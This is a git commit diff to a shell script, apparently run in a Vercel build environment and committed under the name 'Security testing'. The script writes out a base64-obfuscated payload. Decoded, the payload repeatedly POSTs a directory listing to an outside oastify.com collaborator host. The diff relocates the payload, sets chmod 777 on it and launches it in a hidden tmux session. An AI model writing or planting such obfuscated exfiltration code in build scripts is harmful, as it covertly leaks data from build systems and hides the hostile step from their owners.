61575de2ac526f714da7967a7771b4aecd1c14e9
Security testing <118594933+w2h3@users.noreply.github.com>
2024-03-04 15:35:06 +0700

    Update script3.sh

--- script3.sh
+++ script3.sh
@@ -3,5 +3,5 @@
 yum install tmux
 
 echo 'IyEvYmluL2Jhc2gKCndoaWxlIHRydWU7IGRvCiAgICAjIEV4ZWN1dGUgdGhlIGN1cmwgY29tbWFuZAogICAgY3VybCAtWCBQT1NUIC1kICIkKGxzIC1sYSAvdmVyY2VsL3BhdGgwLykiIGh0dHBzOi8vNGtwNnZqM2hqMnZvdmV0Ymg1ejE5eXBsOWNmMzN1dXdpbC5vYXN0aWZ5LmNvbS92ZXJjZWwtYnVpbGQtaW1hZ2UKCiAgICAjIFNsZWVwIGZvciAxIG1pbnV0ZQogICAgc2xlZXAgNDMyMDAKZG9uZQ==' | base64 -d > /vercel/path0/script3.sh
-
-tmux new-session -d -s session_name "bash /vercel/path0/script3.sh"
+mv /vercel/path0/script3.sh /script3.sh && chmod 777 /script3.sh
+tmux new-session -d -s session_name "bash /script3.sh"
